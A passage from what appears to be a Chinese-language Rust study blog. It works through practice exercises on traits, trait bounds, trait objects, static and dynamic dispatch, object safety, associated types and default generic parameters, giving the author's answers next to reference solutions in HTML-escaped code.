&#123;&#125;&quot;, animal.noise());&#125; 12345678910111213141516171819202122232425262728293031323334struct Sheep &#123;&#125;struct Cow &#123;&#125;trait Animal &#123; fn noise(&amp;self) -&gt; String;&#125;impl Animal for Sheep &#123; fn noise(&amp;self) -&gt; String &#123; &quot;baaaaah!&quot;.to_string() &#125;&#125;impl Animal for Cow &#123; fn noise(&amp;self) -&gt; String &#123; &quot;moooooo!&quot;.to_string() &#125;&#125;// Returns some struct that implements Animal, but we don&#x27;t know which one at compile time.// FIX the erros here, you can make a fake random, or you can use trait objectfn random_animal(random_number: f64) -&gt; impl Animal &#123; if random_number &lt; 0.5 &#123; Sheep &#123;&#125; &#125; else &#123; Sheep &#123;&#125; &#125;&#125;fn main() &#123; let random_number = 0.234; let animal = random_animal(random_number); println!(&quot;You&#x27;ve randomly chosen an animal, and it says &#123;&#125;&quot;, animal.noise());&#125; 特征约束impl Trait 语法非常直观简洁，但它实际上是特征约束的语法糖。 当使用泛型参数时，我们往往需要为该参数指定特定的行为，这种指定方式就是通过特征约束来实现的。 🌟🌟 12345678fn main() &#123; assert_eq!(sum(1, 2), 3);&#125;// 通过两种方法使用特征约束来实现 `fn sum`fn sum&lt;T&gt;(x: T, y: T) -&gt; T &#123; x + y&#125; My Answer 12345678fn main() &#123; assert_eq!(sum(1, 2), 3);&#125;// 通过两种方法使用特征约束来实现 `fn sum`fn sum&lt;T:std::ops::Add&lt;Output = T&gt;&gt;(x: T, y: T) -&gt; T &#123; x + y&#125; 12345678910fn main() &#123; assert_eq!(sum(1, 2), 3);&#125;// 通过两种方法使用特征约束来实现 `fn sum`fn sum&lt;T&gt;(x: T, y: T) -&gt; T where T: std::ops::Add&lt;Output = T&gt;&#123; x + y&#125; Answer 12345678fn main() &#123; assert_eq!(sum(1, 2), 3); assert_eq!(sum(1.0, 2.0), 3.0);&#125;fn sum&lt;T: std::ops::Add&lt;Output = T&gt;&gt;(x: T, y: T) -&gt; T &#123; x + y&#125; 1234567891011fn main() &#123; assert_eq!(sum(1, 2), 3); assert_eq!(sum(1.0, 2.0), 3.0);&#125;fn sum&lt;T&gt;(x: T, y: T) -&gt; Twhere T: std::ops::Add&lt;Output = T&gt;,&#123; x + y&#125; 🌟🌟 1234567891011121314151617181920212223242526272829303132333435// 修复代码中的错误struct Pair&lt;T&gt; &#123; x: T, y: T,&#125;impl&lt;T&gt; Pair&lt;T&gt; &#123; fn new(x: T, y: T) -&gt; Self &#123; Self &#123; x, y, &#125; &#125;&#125;impl&lt;T: std::fmt::Debug + PartialOrd&gt; Pair&lt;T&gt; &#123; fn cmp_display(&amp;self) &#123; if self.x &gt;= self.y &#123; println!(&quot;The largest member is x = &#123;:?&#125;&quot;, self.x); &#125; else &#123; println!(&quot;The largest member is y = &#123;:?&#125;&quot;, self.y); &#125; &#125;&#125;struct Unit(i32);fn main() &#123; let pair = Pair&#123; x: Unit(1), y: Unit(3) &#125;; pair.cmp_display();&#125; My Answer 1234567891011121314151617181920212223242526272829303132333435// 修复代码中的错误struct Pair&lt;T&gt; &#123; x: T, y: T,&#125;impl&lt;T&gt; Pair&lt;T&gt; &#123; fn new(x: T, y: T) -&gt; Self &#123; Self &#123; x, y, &#125; &#125;&#125;impl&lt;T: std::fmt::Debug + PartialOrd&gt; Pair&lt;T&gt; &#123; fn cmp_display(&amp;self) &#123; if self.x &gt;= self.y &#123; println!(&quot;The largest member is x = &#123;:?&#125;&quot;, self.x); &#125; else &#123; println!(&quot;The largest member is y = &#123;:?&#125;&quot;, self.y); &#125; &#125;&#125;#[derive(Debug,PartialEq, PartialOrd)]struct Unit(i32);fn main() &#123; let pair = Pair&#123; x: Unit(1), y: Unit(3) &#125;; pair.cmp_display();&#125; Answer 1234567891011121314151617181920212223242526272829303132333435struct Pair&lt;T&gt; &#123; x: T, y: T,&#125;impl&lt;T&gt; Pair&lt;T&gt; &#123; fn new(x: T, y: T) -&gt; Self &#123; Self &#123; x, y, &#125; &#125;&#125;impl&lt;T: std::fmt::Debug + PartialOrd&gt; Pair&lt;T&gt; &#123; fn cmp_display(&amp;self) &#123; if self.x &gt;= self.y &#123; println!(&quot;The largest member is x = &#123;:?&#125;&quot;, self.x); &#125; else &#123; println!(&quot;The largest member is y = &#123;:?&#125;&quot;, self.y); &#125; &#125;&#125;#[derive(Debug, PartialEq, PartialOrd)]struct Unit(i32);fn main() &#123; let pair = Pair&#123; x: Unit(1), y: Unit(3) &#125;; pair.cmp_display();&#125; 🌟🌟🌟 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879// 填空fn example1() &#123; // `T: Trait` 是最常使用的方式 // `T: Fn(u32) -&gt; u32` 说明 `T` 只能接收闭包类型的参数 struct Cacher&lt;T: Fn(u32) -&gt; u32&gt; &#123; calculation: T, value: Option&lt;u32&gt;, &#125; impl&lt;T: Fn(u32) -&gt; u32&gt; Cacher&lt;T&gt; &#123; fn new(calculation: T) -&gt; Cacher&lt;T&gt; &#123; Cacher &#123; calculation, value: None, &#125; &#125; fn value(&amp;mut self, arg: u32) -&gt; u32 &#123; match self.value &#123; Some(v) =&gt; v, None =&gt; &#123; let v = (self.calculation)(arg); self.value = Some(v); v &#125;, &#125; &#125; &#125; let mut cacher = Cacher::new(|x| x+1); assert_eq!(cacher.value(10), __); assert_eq!(cacher.value(15), __);&#125;fn example2() &#123;// 还可以使用 `where` 来约束 Tstruct Cacher&lt;T&gt; where T: Fn(u32) -&gt; u32,&#123; calculation: T, value: Option&lt;u32&gt;,&#125;impl&lt;T&gt; Cacher&lt;T&gt; where T: Fn(u32) -&gt; u32,&#123; fn new(calculation: T) -&gt; Cacher&lt;T&gt; &#123; Cacher &#123; calculation, value: None, &#125; &#125; fn value(&amp;mut self, arg: u32) -&gt; u32 &#123; match self.value &#123; Some(v) =&gt; v, None =&gt; &#123; let v = (self.calculation)(arg); self.value = Some(v); v &#125;, &#125; &#125;&#125;let mut cacher = Cacher::new(|x| x+1);assert_eq!(cacher.value(20), __);assert_eq!(cacher.value(25), __);&#125;fn main() &#123;example1();example2();println!(&quot;Success!&quot;)&#125; My Answer 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576// 填空 fn example1() &#123; // `T: Trait` 是最常使用的方式 // `T: Fn(u32) -&gt; u32` 说明 `T` 只能接收闭包类型的参数 struct Cacher&lt;T: Fn(u32) -&gt; u32&gt; &#123; calculation: T, value: Option&lt;u32&gt;, &#125; impl&lt;T: Fn(u32) -&gt; u32&gt; Cacher&lt;T&gt; &#123; fn new(calculation: T) -&gt; Cacher&lt;T&gt; &#123; Cacher &#123; calculation, value: None, &#125; &#125; fn value(&amp;mut self, arg: u32) -&gt; u32 &#123; match self.value &#123; Some(v) =&gt; v, None =&gt; &#123; let v = (self.calculation)(arg); self.value = Some(v); v &#125;, &#125; &#125; &#125; let mut cacher = Cacher::new(|x| x+1); assert_eq!(cacher.value(10), 11); assert_eq!(cacher.value(15), 11); &#125;fn example2() &#123; // 还可以使用 `where` 来约束 T struct Cacher&lt;T&gt; where T: Fn(u32) -&gt; u32, &#123; calculation: T, value: Option&lt;u32&gt;, &#125; impl&lt;T&gt; Cacher&lt;T&gt; where T: Fn(u32) -&gt; u32, &#123; fn new(calculation: T) -&gt; Cacher&lt;T&gt; &#123; Cacher &#123; calculation, value: None, &#125; &#125; fn value(&amp;mut self, arg: u32) -&gt; u32 &#123; match self.value &#123; Some(v) =&gt; v, None =&gt; &#123; let v = (self.calculation)(arg); self.value = Some(v); v &#125;, &#125; &#125; &#125; let mut cacher = Cacher::new(|x| x+1); assert_eq!(cacher.value(20), 21); assert_eq!(cacher.value(25), 21); &#125;fn main() &#123; example1(); example2(); println!(&quot;Success!&quot;)&#125; Answer 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273fn example1() &#123; // `T: Trait` is the commonly used way // `T: Fn(u32) -&gt; u32` specifies that we can only pass a closure to `T` struct Cacher&lt;T: Fn(u32) -&gt; u32&gt; &#123; calculation: T, value: Option&lt;u32&gt;, &#125; impl&lt;T: Fn(u32) -&gt; u32&gt; Cacher&lt;T&gt; &#123; fn new(calculation: T) -&gt; Cacher&lt;T&gt; &#123; Cacher &#123; calculation, value: None, &#125; &#125; fn value(&amp;mut self, arg: u32) -&gt; u32 &#123; match self.value &#123; Some(v) =&gt; v, None =&gt; &#123; let v = (self.calculation)(arg); self.value = Some(v); v &#125;, &#125; &#125; &#125; let mut cacher = Cacher::new(|x| x+1); assert_eq!(cacher.value(10), 11); assert_eq!(cacher.value(15), 11);&#125;fn example2() &#123; // We can also use `where` to constrain `T` struct Cacher&lt;T&gt; where T: Fn(u32) -&gt; u32, &#123; calculation: T, value: Option&lt;u32&gt;, &#125; impl&lt;T&gt; Cacher&lt;T&gt; where T: Fn(u32) -&gt; u32, &#123; fn new(calculation: T) -&gt; Cacher&lt;T&gt; &#123; Cacher &#123; calculation, value: None, &#125; &#125; fn value(&amp;mut self, arg: u32) -&gt; u32 &#123; match self.value &#123; Some(v) =&gt; v, None =&gt; &#123; let v = (self.calculation)(arg); self.value = Some(v); v &#125;, &#125; &#125; &#125; let mut cacher = Cacher::new(|x| x+1); assert_eq!(cacher.value(20), 21); assert_eq!(cacher.value(25), 21);&#125;fn main() &#123;example1();example2();&#125; 特征对象在特征练习中 我们已经知道当函数返回多个类型时，impl Trait 是无法使用的。 对于数组而言，其中一个限制就是无法存储不同类型的元素，但是通过之前的学习，大家应该知道枚举可以在部分场景解决这种问题，但是这种方法局限性较大。此时就需要我们的主角登场了。 使用dyn返回特征Rust 编译器需要知道一个函数的返回类型占用多少内存空间。由于特征的不同实现类型可能会占用不同的内存，因此通过 impl Trait 返回多个类型是不被允许的，但是我们可以返回一个 dyn 特征对象来解决问题。 🌟🌟🌟 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051trait Bird &#123; fn quack(&amp;self) -&gt; String;&#125;struct Duck;impl Duck &#123; fn swim(&amp;self) &#123; println!(&quot;Look, the duck is swimming&quot;) &#125;&#125;struct Swan;impl Swan &#123; fn fly(&amp;self) &#123; println!(&quot;Look, the duck.. oh sorry, the swan is flying&quot;) &#125;&#125;impl Bird for Duck &#123; fn quack(&amp;self) -&gt; String&#123; &quot;duck duck&quot;.to_string() &#125;&#125;impl Bird for Swan &#123; fn quack(&amp;self) -&gt; String&#123; &quot;swan swan&quot;.to_string() &#125;&#125;fn main() &#123; // 填空 let duck = __; duck.swim(); let bird = hatch_a_bird(2); // 变成鸟儿后，它忘记了如何游，因此以下代码会报错 // bird.swim(); // 但它依然可以叫唤 assert_eq!(bird.quack(), &quot;duck duck&quot;); let bird = hatch_a_bird(1); // 这只鸟儿忘了如何飞翔，因此以下代码会报错 // bird.fly(); // 但它也可以叫唤 assert_eq!(bird.quack(), &quot;swan swan&quot;); println!(&quot;Success!&quot;)&#125; // 实现以下函数fn hatch_a_bird... My Answer 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556trait Bird &#123; fn quack(&amp;self) -&gt; String;&#125;struct Duck;impl Duck &#123; fn swim(&amp;self) &#123; println!(&quot;Look, the duck is swimming&quot;) &#125;&#125;struct Swan;impl Swan &#123; fn fly(&amp;self) &#123; println!(&quot;Look, the duck.. oh sorry, the swan is flying&quot;) &#125;&#125;impl Bird for Duck &#123; fn quack(&amp;self) -&gt; String&#123; &quot;duck duck&quot;.to_string() &#125;&#125;impl Bird for Swan &#123; fn quack(&amp;self) -&gt; String&#123; &quot;swan swan&quot;.to_string() &#125;&#125;fn main() &#123; // 填空 let duck = Duck; duck.swim(); let bird = hatch_a_bird(2); // 变成鸟儿后，它忘记了如何游，因此以下代码会报错 // bird.swim(); // 但它依然可以叫唤 assert_eq!(bird.quack(), &quot;duck duck&quot;); let bird = hatch_a_bird(1); // 这只鸟儿忘了如何飞翔，因此以下代码会报错 // bird.fly(); // 但它也可以叫唤 assert_eq!(bird.quack(), &quot;swan swan&quot;); println!(&quot;Success!&quot;)&#125; // 实现以下函数fn hatch_a_bird(s:u8) -&gt;Box&lt;dyn Bird&gt; &#123; match s &#123; 1 =&gt; Box::new(Swan&#123;&#125;), _ =&gt; Box::new(Duck&#123;&#125;) &#125;&#125; Answer 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455trait Bird &#123; fn quack(&amp;self) -&gt; String;&#125;struct Duck;impl Duck &#123; fn swim(&amp;self) &#123; println!(&quot;Look, the duck is swimming&quot;) &#125;&#125;struct Swan;impl Swan &#123; fn fly(&amp;self) &#123; println!(&quot;Look, the duck.. oh sorry, the swan is flying&quot;) &#125;&#125;impl Bird for Duck &#123; fn quack(&amp;self) -&gt; String&#123; &quot;duck duck&quot;.to_string() &#125;&#125;impl Bird for Swan &#123; fn quack(&amp;self) -&gt; String&#123; &quot;swan swan&quot;.to_string() &#125;&#125;fn main() &#123; let duck = Duck; duck.swim(); let bird = hatch_a_bird(2); // this bird has forgotten how to swim, so below line will cause an error // bird.swim(); // but it can quack assert_eq!(bird.quack(), &quot;duck duck&quot;); let bird = hatch_a_bird(1); // this bird has forgotten how to fly, so below line will cause an error // bird.fly(); // but it can quack too assert_eq!(bird.quack(), &quot;swan swan&quot;); println!(&quot;Success!&quot;)&#125; fn hatch_a_bird(species: u8) -&gt;Box&lt;dyn Bird&gt; &#123; if species == 1 &#123; Box::new(Swan&#123;&#125;) &#125; else &#123; Box::new(Duck&#123;&#125;) &#125;&#125; 在数组中使用特征对象 🌟🌟 12345678910111213141516171819202122232425262728293031323334353637383940trait Bird &#123; fn quack(&amp;self);&#125;struct Duck;impl Duck &#123; fn fly(&amp;self) &#123; println!(&quot;Look, the duck is flying&quot;) &#125;&#125;struct Swan;impl Swan &#123; fn fly(&amp;self) &#123; println!(&quot;Look, the duck.. oh sorry, the swan is flying&quot;) &#125;&#125;impl Bird for Duck &#123; fn quack(&amp;self) &#123; println!(&quot;&#123;&#125;&quot;, &quot;duck duck&quot;); &#125;&#125;impl Bird for Swan &#123; fn quack(&amp;self) &#123; println!(&quot;&#123;&#125;&quot;, &quot;swan swan&quot;); &#125;&#125;fn main() &#123; // 填空 let birds __; for bird in birds &#123; bird.quack(); // 当 duck 和 swan 变成 bird 后，它们都忘了如何翱翔于天际，只记得该怎么叫唤了。。 // 因此，以下代码会报错 // bird.fly(); &#125;&#125; My Answer 12345678910111213141516171819202122232425262728293031323334353637383940trait Bird &#123; fn quack(&amp;self);&#125;struct Duck;impl Duck &#123; fn fly(&amp;self) &#123; println!(&quot;Look, the duck is flying&quot;) &#125;&#125;struct Swan;impl Swan &#123; fn fly(&amp;self) &#123; println!(&quot;Look, the duck.. oh sorry, the swan is flying&quot;) &#125;&#125;impl Bird for Duck &#123; fn quack(&amp;self) &#123; println!(&quot;&#123;&#125;&quot;, &quot;duck duck&quot;); &#125;&#125;impl Bird for Swan &#123; fn quack(&amp;self) &#123; println!(&quot;&#123;&#125;&quot;, &quot;swan swan&quot;); &#125;&#125;fn main() &#123; // 填空 let birds: [Box&lt;dyn Bird&gt;; 2] = [Box::new(Duck &#123;&#125;), Box::new(Swan &#123;&#125;)]; for bird in birds &#123; bird.quack(); // 当 duck 和 swan 变成 bird 后，它们都忘了如何翱翔于天际，只记得该怎么叫唤了。。 // 因此，以下代码会报错 // bird.fly(); &#125;&#125; Answer 123456789101112131415161718192021222324252627282930313233343536373839trait Bird &#123; fn quack(&amp;self);&#125;struct Duck;impl Duck &#123; fn fly(&amp;self) &#123; println!(&quot;Look, the duck is flying&quot;) &#125;&#125;struct Swan;impl Swan &#123; fn fly(&amp;self) &#123; println!(&quot;Look, the duck.. oh sorry, the swan is flying&quot;) &#125;&#125;impl Bird for Duck &#123; fn quack(&amp;self) &#123; println!(&quot;&#123;&#125;&quot;, &quot;duck duck&quot;); &#125;&#125;impl Bird for Swan &#123; fn quack(&amp;self) &#123; println!(&quot;&#123;&#125;&quot;, &quot;swan swan&quot;); &#125;&#125;fn main() &#123; let birds: [Box&lt;dyn Bird&gt;; 2] = [Box::new(Duck &#123;&#125;), Box::new(Swan &#123;&#125;)]; for bird in birds &#123; bird.quack(); // when duck and swan turn into Bird, they all forget how to fly, and only remember how to quack // so, the below code will cause an error // bird.fly(); &#125;&#125; &amp;dyn and Box 🌟🌟 12345678910111213141516171819202122232425262728293031323334353637// 填空trait Draw &#123; fn draw(&amp;self) -&gt; String;&#125;impl Draw for u8 &#123; fn draw(&amp;self) -&gt; String &#123; format!(&quot;u8: &#123;&#125;&quot;, *self) &#125;&#125;impl Draw for f64 &#123; fn draw(&amp;self) -&gt; String &#123; format!(&quot;f64: &#123;&#125;&quot;, *self) &#125;&#125;fn main() &#123; let x = 1.1f64; let y = 8u8; // draw x draw_with_box(__); // draw y draw_with_ref(&amp;y); println!(&quot;Success!&quot;)&#125;fn draw_with_box(x: Box&lt;dyn Draw&gt;) &#123; x.draw();&#125;fn draw_with_ref(x: __) &#123; x.draw();&#125; My Answer 12345678910111213141516171819202122232425262728293031323334353637// 填空trait Draw &#123; fn draw(&amp;self) -&gt; String;&#125;impl Draw for u8 &#123; fn draw(&amp;self) -&gt; String &#123; format!(&quot;u8: &#123;&#125;&quot;, *self) &#125;&#125;impl Draw for f64 &#123; fn draw(&amp;self) -&gt; String &#123; format!(&quot;f64: &#123;&#125;&quot;, *self) &#125;&#125;fn main() &#123; let x = 1.1f64; let y = 8u8; // draw x draw_with_box(Box::new(x)); // draw y draw_with_ref(&amp;y); println!(&quot;Success!&quot;)&#125;fn draw_with_box(x: Box&lt;dyn Draw&gt;) &#123; x.draw();&#125;fn draw_with_ref(x: &amp;dyn Draw) &#123; x.draw();&#125; Answer 12345678910111213141516171819202122232425262728293031323334trait Draw &#123; fn draw(&amp;self) -&gt; String;&#125;impl Draw for u8 &#123; fn draw(&amp;self) -&gt; String &#123; format!(&quot;u8: &#123;&#125;&quot;, *self) &#125;&#125;impl Draw for f64 &#123; fn draw(&amp;self) -&gt; String &#123; format!(&quot;f64: &#123;&#125;&quot;, *self) &#125;&#125;fn main() &#123; let x = 1.1f64; let y = 8u8; // draw x draw_with_box(Box::new(x)); // draw y draw_with_ref(&amp;y);&#125;fn draw_with_box(x: Box&lt;dyn Draw&gt;) &#123; x.draw();&#125;fn draw_with_ref(x: &amp;dyn Draw) &#123; x.draw();&#125; 静态分发和动态分发Static and Dynamic dispatch关于这块内容的解析介绍，请参见 Rust语言圣经。 🌟🌟 123456789101112131415161718192021222324252627trait Foo &#123; fn method(&amp;self) -&gt; String;&#125;impl Foo for u8 &#123; fn method(&amp;self) -&gt; String &#123; format!(&quot;u8: &#123;&#125;&quot;, *self) &#125;&#125;impl Foo for String &#123; fn method(&amp;self) -&gt; String &#123; format!(&quot;string: &#123;&#125;&quot;, *self) &#125;&#125;// 通过泛型实现以下函数fn static_dispatch...// 通过特征对象实现以下函数fn dynamic_dispatch...fn main() &#123; let x = 5u8; let y = &quot;Hello&quot;.to_string(); static_dispatch(x); dynamic_dispatch(&amp;y); println!(&quot;Success!&quot;)&#125; My Answer 123456789101112131415161718192021222324252627282930313233trait Foo &#123; fn method(&amp;self) -&gt; String;&#125;impl Foo for u8 &#123; fn method(&amp;self) -&gt; String &#123; format!(&quot;u8: &#123;&#125;&quot;, *self) &#125;&#125;impl Foo for String &#123; fn method(&amp;self) -&gt; String &#123; format!(&quot;string: &#123;&#125;&quot;, *self) &#125;&#125;// 通过泛型实现以下函数fn static_dispatch&lt;T:Foo&gt;(x:T)&#123; x.method();&#125;// 通过特征对象实现以下函数fn dynamic_dispatch(x:&amp;dyn Foo)&#123; x.method();&#125;fn main() &#123; let x = 5u8; let y = &quot;Hello&quot;.to_string(); static_dispatch(x); dynamic_dispatch(&amp;y); println!(&quot;Success!&quot;)&#125; Answer 12345678910111213141516171819202122232425262728293031trait Foo &#123; fn method(&amp;self) -&gt; String;&#125;impl Foo for u8 &#123; fn method(&amp;self) -&gt; String &#123; format!(&quot;u8: &#123;&#125;&quot;, *self) &#125;&#125;impl Foo for String &#123; fn method(&amp;self) -&gt; String &#123; format!(&quot;string: &#123;&#125;&quot;, *self) &#125;&#125;// implement below with genericsfn static_dispatch&lt;T: Foo&gt;(x: T) &#123; x.method();&#125;// implement below with trait objectsfn dynamic_dispatch(x: &amp;dyn Foo) &#123; x.method();&#125;fn main() &#123; let x = 5u8; let y = &quot;Hello&quot;.to_string(); static_dispatch(x); dynamic_dispatch(&amp;y); println!(&quot;Success!&quot;)&#125; 对象安全一个特征能变成特征对象，首先该特征必须是对象安全的，即该特征的所有方法都必须拥有以下特点： 返回类型不能是 Self. 不能使用泛型参数 🌟🌟🌟🌟 123456789101112131415161718192021222324// 使用至少两种方法让代码工作// 不要添加/删除任何代码行trait MyTrait &#123; fn f(&amp;self) -&gt; Self;&#125;impl MyTrait for u32 &#123; fn f(&amp;self) -&gt; Self &#123; 42 &#125;&#125;impl MyTrait for String &#123; fn f(&amp;self) -&gt; Self &#123; self.clone() &#125;&#125;fn my_function(x: Box&lt;dyn MyTrait&gt;) &#123; x.f()&#125;fn main() &#123; my_function(Box::new(13_u32)); my_function(Box::new(String::from(&quot;abc&quot;))); println!(&quot;Success!&quot;)&#125; My Answer 不会 Answer 1234567891011121314151617181920trait MyTrait &#123; fn f(&amp;self) -&gt; Self;&#125;impl MyTrait for u32 &#123; fn f(&amp;self) -&gt; u32 &#123; 42 &#125;&#125;impl MyTrait for String &#123; fn f(&amp;self) -&gt; String &#123; self.clone() &#125;&#125;fn my_function(x: impl MyTrait) -&gt; impl MyTrait &#123; x.f()&#125;fn main() &#123; my_function(13_u32); my_function(String::from(&quot;abc&quot;));&#125; 1234567891011121314151617181920trait MyTrait &#123; fn f(&amp;self) -&gt; Box&lt;dyn MyTrait&gt;;&#125;impl MyTrait for u32 &#123; fn f(&amp;self) -&gt; Box&lt;dyn MyTrait&gt; &#123; Box::new(42) &#125;&#125;impl MyTrait for String &#123; fn f(&amp;self) -&gt; Box&lt;dyn MyTrait&gt; &#123; Box::new(self.clone()) &#125;&#125;fn my_function(x: Box&lt;dyn MyTrait&gt;) -&gt; Box&lt;dyn MyTrait&gt; &#123; x.f()&#125;fn main() &#123; my_function(Box::new(13_u32)); my_function(Box::new(String::from(&quot;abc&quot;)));&#125; 进一步深入特征类型关联类型关联类型主要用于提升代码的可读性，例如以下代码 : 123456789#![allow(unused)]fn main() &#123;pub trait CacheableItem: Clone + Default + fmt::Debug + Decodable + Encodable &#123; type Address: AsRef&lt;[u8]&gt; + Clone + fmt::Debug + Eq + Hash; fn is_null(&amp;self) -&gt; bool;&#125;&#125; 相比 AsRef&lt;[u8]&gt; + Clone + fmt::Debug + Eq + Hash， Address 的使用可以极大的减少其它类型在实现该特征时所需的模版代码. 🌟🌟🌟 1234567891011121314151617181920212223242526272829303132333435363738394041424344struct Container(i32, i32);// 使用关联类型实现重新实现以下特征// trait Contains &#123;// type A;// type B;trait Contains&lt;A, B&gt; &#123; fn contains(&amp;self, _: &amp;A, _: &amp;B) -&gt; bool; fn first(&amp;self) -&gt; i32; fn last(&amp;self) -&gt; i32;&#125;impl Contains&lt;i32, i32&gt; for Container &#123; fn contains(&amp;self, number_1: &amp;i32, number_2: &amp;i32) -&gt; bool &#123; (&amp;self.0 == number_1) &amp;&amp; (&amp;self.1 == number_2) &#125; // Grab the first number. fn first(&amp;self) -&gt; i32 &#123; self.0 &#125; // Grab the last number. fn last(&amp;self) -&gt; i32 &#123; self.1 &#125;&#125;fn difference&lt;A, B, C: Contains&lt;A, B&gt;&gt;(container: &amp;C) -&gt; i32 &#123; container.last() - container.first()&#125;fn main() &#123; let number_1 = 3; let number_2 = 10; let container = Container(number_1, number_2); println!(&quot;Does container contain &#123;&#125; and &#123;&#125;: &#123;&#125;&quot;, &amp;number_1, &amp;number_2, container.contains(&amp;number_1, &amp;number_2)); println!(&quot;First number: &#123;&#125;&quot;, container.first()); println!(&quot;Last number: &#123;&#125;&quot;, container.last()); println!(&quot;The difference is: &#123;&#125;&quot;, difference(&amp;container));&#125; My Answer 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748struct Container(i32, i32);// 使用关联类型实现重新实现以下特征// trait Contains &#123;// type A;// type B;trait Contains &#123; type A; type B; fn contains(&amp;self, _: &amp;Self::A, _: &amp;Self::B) -&gt; bool; fn first(&amp;self) -&gt; i32; fn last(&amp;self) -&gt; i32;&#125; impl Contains for Container &#123; type A = i32; type B = i32; fn contains(&amp;self, number_1: &amp;i32, number_2: &amp;i32) -&gt; bool &#123; (&amp;self.0 == number_1) &amp;&amp; (&amp;self.1 == number_2) &#125; // Grab the first number. fn first(&amp;self) -&gt; i32 &#123; self.0 &#125; // Grab the last number. fn last(&amp;self) -&gt; i32 &#123; self.1 &#125;&#125;fn difference&lt;C:Contains&gt;(container: &amp;C) -&gt; i32 &#123; container.last() - container.first()&#125;fn main() &#123; let number_1 = 3; let number_2 = 10; let container = Container(number_1, number_2); println!(&quot;Does container contain &#123;&#125; and &#123;&#125;: &#123;&#125;&quot;, &amp;number_1, &amp;number_2, container.contains(&amp;number_1, &amp;number_2)); println!(&quot;First number: &#123;&#125;&quot;, container.first()); println!(&quot;Last number: &#123;&#125;&quot;, container.last()); println!(&quot;The difference is: &#123;&#125;&quot;, difference(&amp;container));&#125; Answer 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950struct Container(i32, i32);// A trait which checks if 2 items are stored inside of container.// Also retrieves first or last value.trait Contains &#123; // Define generic types here which methods will be able to utilize. type A; type B; fn contains(&amp;self, _: &amp;Self::A, _: &amp;Self::B) -&gt; bool; fn first(&amp;self) -&gt; i32; fn last(&amp;self) -&gt; i32;&#125;impl Contains for Container &#123; // Specify what types `A` and `B` are. If the `input` type // is `Container(i32, i32)`, the `output` types are determined // as `i32` and `i32`. type A = i32; type B = i32; // `&amp;Self::A` and `&amp;Self::B` are also valid here. fn contains(&amp;self, number_1: &amp;i32, number_2: &amp;i32) -&gt; bool &#123; (&amp;self.0 == number_1) &amp;&amp; (&amp;self.1 == number_2) &#125; // Grab the first number. fn first(&amp;self) -&gt; i32 &#123; self.0 &#125; // Grab the last number. fn last(&amp;self) -&gt; i32 &#123; self.1 &#125;&#125;fn difference&lt;C: Contains&gt;(container: &amp;C) -&gt; i32 &#123; container.last() - container.first()&#125;fn main() &#123; let number_1 = 3; let number_2 = 10; let container = Container(number_1, number_2); println!(&quot;Does container contain &#123;&#125; and &#123;&#125;: &#123;&#125;&quot;, &amp;number_1, &amp;number_2, container.contains(&amp;number_1, &amp;number_2)); println!(&quot;First number: &#123;&#125;&quot;, container.first()); println!(&quot;Last number: &#123;&#125;&quot;, container.last()); println!(&quot;The difference is: &#123;&#125;&quot;, difference(&amp;container));&#125; 定义默认的泛型类型参数当我们使用泛型类型参数时，可以为该泛型参数指定一个具体的默认类型，这样当实现该特征时，如果该默认类型可以使用，那用户再无需手动指定具体的类型。 🌟🌟 12345678910111213141516171819202122232425262728use std::ops::Sub;#[derive(Debug, PartialEq)]struct Point&lt;T&gt; &#123; x: T, y: T,&#125;// 用三种方法填空: 其中两种使用默认的泛型参数，另外一种不使用impl __ &#123; type Output = Self; fn sub(self, other: Self) -&gt; Self::Output &#123; Point &#123; x: self.x - other.x, y: self.y - other.y, &#125; &#125;&#125;fn main() &#123; assert_eq!(Point &#123; x: 2, y: 3 &#125; - Point &#123; x: 1, y: 0 &#125;, Point &#123; x: 1, y: 3 &#125;); println!(&quot;Success!&quot;)&#125; My Answer 12345678910111213141516171819202122232425262728use std::ops::Sub;#[derive(Debug, PartialEq)]struct Point&lt;T&gt; &#123; x: T, y: T,&#125;// 用三种方法填空: 其中两种使用默认的泛型参数，另外一种不使用impl&lt;T:Sub&lt;Output = T&gt;&gt; Sub for Point&lt;T&gt; &#123; type Output = Self; fn sub(self, other: Self) -&gt; Self::Output &#123; Point &#123; x: self.x - other.x, y: self.y - other.y, &#125; &#125;&#125;fn main() &#123; assert_eq!(Point &#123; x: 2, y: 3 &#125; - Point &#123; x: 1, y: 0 &#125;, Point &#123; x: 1, y: 3 &#125;); println!(&quot;Success!&quot;)&#125; 12345678910111213141516171819202122232425262728use std::ops::Sub;#[derive(Debug, PartialEq)]struct Point&lt;T&gt; &#123; x: T, y: T,&#125;// 用三种方法填空: 其中两种使用默认的泛型参数，另外一种不使用impl&lt;T:Sub&lt;Output = T&gt;&gt; Sub&lt;Point&lt;T&gt;&gt; for Point&lt;T&gt; &#123; type Output = Self; fn sub(self, other: Point&lt;T&gt;) -&gt; Self::Output &#123; Point &#123; x: self.x - other.x, y: self.y - other.y, &#125; &#125;&#125;fn main() &#123; assert_eq!(Point &#123; x: 2, y: 3 &#125; - Point &#123; x: 1, y: 0 &#125;, Point &#123; x: 1, y: 3 &#125;); println!(&quot;Success!&quot;)&#125; 12345678910111213141516171819202122232425262728use std::ops::Sub;#[derive(Debug, PartialEq)]struct Point&lt;T&gt; &#123; x: T, y: T,&#125;// 用三种方法填空: 其中两种使用默认的泛型参数，另外一种不使用impl&lt;T:Sub&lt;Output = T&gt;&gt; Sub&lt;Self&gt; for Point&lt;T&gt; &#123; type Output = Self; fn sub(self, other: Point&lt;T&gt;) -&gt; Self::Output &#123; Point &#123; x: self.x - other.x, y: self.y - other.y, &#125; &#125;&#125;fn main() &#123; assert_eq!(Point &#123; x: 2, y: 3 &#125; - Point &#123; x: 1, y: 0 &#125;, Point &#123; x: 1, y: 3 &#125;); println!(&quot;Success!&quot;)&#125; Answer 12345678910impl&lt;T: Sub&lt;Output = T&gt;&gt; Sub&lt;Point&lt;T&gt;&gt; for Point&lt;T&gt; &#123; type Output = Self; fn sub(self, other: Self) -&gt; Self::Output &#123; Point &#123; x: self.x 